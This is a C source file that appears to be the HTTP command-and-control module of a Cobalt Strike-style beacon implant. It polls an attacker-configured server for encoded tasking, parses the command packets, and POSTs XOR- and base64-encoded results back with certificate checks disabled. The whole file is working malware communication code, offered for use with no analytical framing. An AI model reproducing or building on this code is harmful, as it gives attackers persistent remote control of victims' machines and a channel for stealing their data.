#include "Http.h"
#include "Config.h"
#include "Util.h"
#include "Command.h"

unsigned char* removePrefixAndSuffix(unsigned char* data, unsigned char* prefix, unsigned char* suffix) {
    size_t prefixLen = strlen(prefix);
    size_t suffixLen = strlen(suffix);
    size_t dataLen = strlen(data);

    if (strncmp(data, prefix, prefixLen) == 0 &&
        strncmp(data + (dataLen - suffixLen), suffix, suffixLen) == 0) {
        data[dataLen - suffixLen] = '\0';
        return data + prefixLen;
    }

    return data; 
}

unsigned char* parseGetResponse(unsigned char* data, size_t post_data_length, size_t* responsedatalen) {
    //去除 data= 和 %%
    data = removePrefixAndSuffix(data, g_response_prepend, g_response_append);

    size_t data_length = strlen(data);
    unsigned char g_netbios_key = 'a';
    size_t netbios_dec_data_length;

    // NetBIOS 解码
    unsigned char* netbios_dec_data = NetbiosDecode((unsigned char*)data, data_length, g_netbios_key, &netbios_dec_data_length);

    // 错误，Mask 密钥都存在四个字节
    // 如果小于 5 字节说明数据有问题
    if (netbios_dec_data_length < 5) {
        *responsedatalen = 0;
        return NULL;
    }

    // Mask 解码，就是 XOR
    // 前四字节为 XOR 密钥
    unsigned char key[] = { netbios_dec_data[0], netbios_dec_data[1], netbios_dec_data[2], netbios_dec_data[3] };
    int key_length = sizeof(key) / sizeof(key[0]);
    size_t dec_data_length = netbios_dec_data_length - 4;
    unsigned char* dec_data = MaskDecode((unsigned char*)&netbios_dec_data[4], dec_data_length, key, key_length);

    // Mask解码后长度小于 16 字节 AES 一组都不够 即返回错误
    if (dec_data_length < 16) {
        *responsedatalen = 0;
        return NULL;
    }

    *responsedatalen = dec_data_length;

    return dec_data;
}

unsigned char* parsePacket(unsigned char* total_buffer, uint32_t* total_length, uint32_t* command_type ,size_t* command_length, size_t* count) {
    // 数据包格式：cmdType(4Bytes) | commandLen(4Bytes) | command_buffer || cmdType(4Bytes) | commandLen(4Bytes) | command_buffer(4Bytes) || ...

    // 没有足够的 cmdType + commandLen
    if (*total_length < 8) {
        return NULL;
    }

    unsigned char* buffer;

    if (*count > 0) {

        buffer = total_buffer + *count;
    }
    else
    {
        buffer = total_buffer;
    }

    datap parser;
	BeaconDataParse(&parser, buffer, *total_length);
	*command_type = (uint32_t)BeaconDataInt(&parser);
	*command_length = (size_t)BeaconDataInt(&parser);

	// 没有足够的 command_buffer
    if(*total_length < (8 + *command_length)) {
        fprintf(stderr, "Not enough command_buffer\n");
        return NULL;
	}

    unsigned char* command_buffer = BeaconDataPtr(&parser, *command_length);

    // 留下剩下的数据包长度
    *total_length = *total_length - (4 + 4 + *command_length);

    *count = *count + *command_length + 8;

    return command_buffer;
}

unsigned char* GET(wchar_t* cookie_data, size_t* response_size) {
    const int RETRY_DELAY_MS = 60000;
    while (TRUE) {
        HINTERNET hSession = NULL;
        HINTERNET hConnect = NULL;
        HINTERNET hRequest = NULL;

        DWORD bytesRead = 0;
        unsigned char buffer[4096];
        unsigned char* response_data = NULL;
        size_t totalSize = 0;

        // 初始化 WinHttp 会话
        hSession = WinHttpOpen(NULL,
            WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
            WINHTTP_NO_PROXY_NAME,
            WINHTTP_NO_PROXY_BYPASS, 0);

        if (!hSession) {
            fprintf(stderr, "WinHttpOpen failed with error:%lu\n", GetLastError());
			goto cleanup;
        }

        // 连接服务器
        hConnect = WinHttpConnect(hSession, g_server, g_port, 0);
        if (!hConnect) {
            fprintf(stderr, "WinHttpConnect failed with error:%lu\n", GetLastError());
			goto cleanup;
        }

        hRequest = WinHttpOpenRequest(hConnect,
            L"GET", g_get_path, NULL, WINHTTP_NO_REFERER,
            WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
        if (!hRequest) {
            fprintf(stderr, "WinHttpOpenRequest failed with error:%lu\n", GetLastError());
            goto cleanup;
        }

        // 添加请求头
        WinHttpAddRequestHeaders(hRequest, g_host_header, (DWORD)-1L, WINHTTP_ADDREQ_FLAG_ADD | WINHTTP_ADDREQ_FLAG_REPLACE);
        WinHttpAddRequestHeaders(hRequest, cookie_data, (DWORD)-1L, WINHTTP_ADDREQ_FLAG_ADD | WINHTTP_ADDREQ_FLAG_REPLACE);
        WinHttpAddRequestHeaders(hRequest, g_user_agent_header, (DWORD)-1L, WINHTTP_ADDREQ_FLAG_ADD | WINHTTP_ADDREQ_FLAG_REPLACE);

        // 发送请求
        if (!WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
            WINHTTP_NO_REQUEST_DATA, 0, 0, 0)) {
            fprintf(stderr, "WinHttpSendRequest failed with error:%lu\n", GetLastError());
            goto cleanup;
        }

        // 接受响应
        if (!WinHttpReceiveResponse(hRequest, NULL)) {
            fprintf(stderr, "WinHttpReceiveResponse failed with error: %lu\n", GetLastError());
			goto cleanup;
        }

        do {
            if (!WinHttpReadData(hRequest, buffer, sizeof(buffer), &bytesRead)) {
                fprintf(stderr, "WinHttpReadData failed with error:%lu\n", GetLastError());
                free(response_data);
                response_data = NULL;
                break;
            }

            if (bytesRead > 0) {
                unsigned char* temp = realloc(response_data, totalSize + bytesRead);
                if (!temp) {
                    fprintf(stderr, "realloc failed\n");
                    free(response_data);
                    response_data = NULL;
                    break;
                }
                response_data = temp;
                memcpy(response_data + totalSize, buffer, bytesRead);
                totalSize += bytesRead;
            }
        } while (bytesRead > 0);

        *response_size = totalSize;

        if (!response_data) {
            goto cleanup;
        }

    cleanup:
		if (hSession) WinHttpCloseHandle(hSession);
		if (hConnect) WinHttpCloseHandle(hConnect);
        if (hRequest) WinHttpCloseHandle(hRequest);
		if (response_data) return response_data;
        Sleep(RETRY_DELAY_MS);
    }
}

unsigned char* make_beacon_id_header() {
    // g_client_id为 100000 - 999998 之间的偶数
    // g_client_id 位数
    DWORD digits = 6; 

    // 加终止符 '\0'
    int char_id_length = digits + 1;

    unsigned char* char_id = (unsigned char*)malloc(char_id_length);
    if (!char_id) {
        fprintf(stderr, "Memory allocation failed\n");
        return NULL;
    }

    // 转化为字符串
    int rs = snprintf((unsigned char*)char_id, char_id_length, "%d", g_client_id);
    if (rs < 0 || rs >= char_id_length) {
        fprintf(stderr, "String conversion failed for g_client_id: %d\n", g_client_id);
        free(char_id);
        return NULL;
    }

    size_t xor_encoded_id_length;

    // XOR
    unsigned char* xor_encoded_id = MaskEncode(char_id, strlen(char_id), &xor_encoded_id_length);

    size_t netbios_encoded_id_length;

    // NetBios
    unsigned char* netbios_encoded_id = NetbiosEncode(xor_encoded_id, xor_encoded_id_length, g_netbios_key, &netbios_encoded_id_length);

    unsigned char* result = (unsigned char*)malloc(netbios_encoded_id_length + strlen(g_post_header_name) + strlen(g_http_post_id_prepend) + strlen(g_http_post_id_append) + 1);
    if (!result) {
        fprintf(stderr, "Memory allocation failed\n");
        free(xor_encoded_id);
        free(netbios_encoded_id);
        free(char_id);
        return NULL;
	}

    // User:user=APNDCONJDOOBBMOKDPOB%%
    size_t offset = 0;
    memcpy(result + offset, g_post_header_name, strlen(g_post_header_name));
    offset += strlen(g_post_header_name);
    memcpy(result + offset, g_http_post_id_prepend, strlen(g_http_post_id_prepend));
    offset += strlen(g_http_post_id_prepend);
    memcpy(result + offset, netbios_encoded_id, netbios_encoded_id_length);
    offset += netbios_encoded_id_length;
    memcpy(result + offset, g_http_post_id_append, strlen(g_http_post_id_append));
    offset += strlen(g_http_post_id_append);

    result[offset] = '\0';

    free(xor_encoded_id);
    free(netbios_encoded_id);
    free(char_id);

    return result;
}

unsigned char* make_post_data(unsigned char* post_buffer, size_t post_length, int callback) {
    size_t packet_length;
    unsigned char* packet = MakePacket(callback, post_buffer, post_length, &packet_length);

    size_t xor_packet_length;
    // XOR
    unsigned char* xor_packet = MaskEncode(packet, packet_length, &xor_packet_length);
    // Base64
    unsigned char* base64_packet = base64Encode(xor_packet, xor_packet_length);

    unsigned char* post_data = (unsigned char*)malloc(strlen(base64_packet) + strlen(g_http_post_client_output_prepend) + strlen(g_http_post_client_output_append) + 1);

    // data = post_data%%
    // strcat 会自动写入 \0
    if (post_data) {
        strcpy(post_data, g_http_post_client_output_prepend);
        strcpy(post_data, g_http_post_client_output_prepend);
        strcat(post_data, base64_packet);
        strcat(post_data, g_http_post_client_output_append);
    }

    free(packet);
    free(base64_packet);
	free(xor_packet);
    return post_data;
}

BOOL POST(unsigned char* post_data, size_t post_data_length, wchar_t* beacon_id_wheader) {
    HINTERNET hSession = NULL;
    HINTERNET hConnect = NULL;
    HINTERNET hRequest = NULL;

    // 初始化 WinHttp 会话
    hSession = WinHttpOpen(NULL,
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) {
        fprintf(stderr, "WinHttpOpen failed with error: %lu\n", GetLastError());
        return FALSE;
    }

    // 连接到服务器
    hConnect = WinHttpConnect(hSession, g_server, g_port, 0);
    if (!hConnect) {
        fprintf(stderr, "WinHttpConnect failed with error: %lu\n", GetLastError());
        goto cleanup;
        return FALSE;
    }

    // 创建 POST 请求
    hRequest = WinHttpOpenRequest(hConnect,
        L"POST",
        g_post_path,
        NULL,
        WINHTTP_NO_REFERER,
        WINHTTP_DEFAULT_ACCEPT_TYPES,
        0);
    if (!hRequest) {
        fprintf(stderr, "WinHttpOpenRequest failed with error: %lu\n", GetLastError());
        goto cleanup;
        return FALSE;
    }

    WinHttpAddRequestHeaders(hRequest, beacon_id_wheader, (DWORD)-1L, WINHTTP_ADDREQ_FLAG_ADD | WINHTTP_ADDREQ_FLAG_REPLACE);
    WinHttpAddRequestHeaders(hRequest, g_host_header, (DWORD)-1L, WINHTTP_ADDREQ_FLAG_ADD | WINHTTP_ADDREQ_FLAG_REPLACE);
    WinHttpAddRequestHeaders(hRequest, g_user_agent_header, (DWORD)-1L, WINHTTP_ADDREQ_FLAG_ADD | WINHTTP_ADDREQ_FLAG_REPLACE);
    WinHttpAddRequestHeaders(hRequest, g_server_header, (DWORD)-1L, WINHTTP_ADDREQ_FLAG_ADD | WINHTTP_ADDREQ_FLAG_REPLACE);
    WinHttpAddRequestHeaders(hRequest, g_content_type_header, (DWORD)-1L, WINHTTP_ADDREQ_FLAG_ADD | WINHTTP_ADDREQ_FLAG_REPLACE);

    // 设置安全标志以忽略证书验证错误
    DWORD dwFlags = SECURITY_FLAG_IGNORE_UNKNOWN_CA |
        SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
        SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
        SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;

    WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &dwFlags, sizeof(dwFlags));

    // 发送 POST 请求，附带请求体数据
    if (!WinHttpSendRequest(hRequest,
        WINHTTP_NO_ADDITIONAL_HEADERS, 0,          // 没有额外的请求头
        (LPVOID)post_data, post_data_length,       // 请求体数据和长度
        post_data_length,                          // 总数据长度
        0)) {
        fprintf(stderr, "WinHttpSendRequest failed with error: %lu\n", GetLastError());
        goto cleanup;
        return FALSE;
    }

cleanup:
    if (hSession) WinHttpCloseHandle(hSession);
	if (hConnect) WinHttpCloseHandle(hConnect);
    if (hRequest) WinHttpCloseHandle(hRequest); return TRUE;
}
